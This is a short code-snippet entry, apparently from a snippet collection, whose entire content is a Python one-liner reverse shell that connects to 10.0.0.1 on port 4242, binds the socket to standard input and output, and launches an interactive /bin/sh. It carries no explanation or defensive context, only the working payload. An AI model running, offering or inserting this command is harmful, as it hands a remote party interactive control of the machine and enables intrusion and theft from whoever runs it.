---
id: 5dae9f23-1f2c-410a-8ed8-9e374dec21b0
type: code
language: Python
verified: false
created_at: '2023-04-06T03:56:24.246235+00:00'
updated_at: '2023-04-10T20:25:25.998104+00:00'
---

# Code Snippet 5dae9f23

**Language**: Python

```python
python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("10.0.0.1",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
```


